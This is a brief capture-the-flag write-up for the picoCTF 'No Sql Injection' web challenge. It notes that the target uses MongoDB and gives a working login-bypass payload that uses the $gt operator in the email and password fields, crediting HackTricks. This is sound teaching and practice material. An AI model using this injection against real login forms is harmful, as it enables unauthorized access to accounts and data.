# No Sql Injection

```markdown
Tags: `Web Exploitation` `browser_webshell_solvable`
```

## **Description**

Can you try to get access to this website to get the flag? You can download the source [here](https://artifacts.picoctf.net/c\_atlas/29/app.tar.gz). The website is running [here](http://atlas.picoctf.net:61553/). Can you log in?

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption><p>Found that use MongoDB</p></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 1 (8).png" alt=""><figcaption></figcaption></figure>

## Flag

```sql
email: {"$gt": ""} password: {"$gt": ""}
#Thanks https://book.hacktricks.xyz/pentesting-web/nosql-injection#mongodb-payloads
```

<figure><img src="../.gitbook/assets/Pasted image (34).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
